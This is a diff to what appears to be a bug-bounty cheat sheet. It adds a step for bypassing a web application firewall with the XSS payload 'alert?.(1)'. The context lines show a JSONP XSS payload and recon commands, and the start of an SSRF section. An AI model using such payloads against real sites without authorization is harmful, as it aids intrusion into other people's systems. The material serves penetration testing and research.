@@ -112,6 +112,10 @@ waybackurls target | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sor
 ```
 www.google.com/complete/search?client=chrome&q=1&jsonp=alert(1)//
 ```
+10-bypass waf
+```
+alert?.(1)
+```
 # SSRF
 1-Try other URL schemes:<br>
 ```
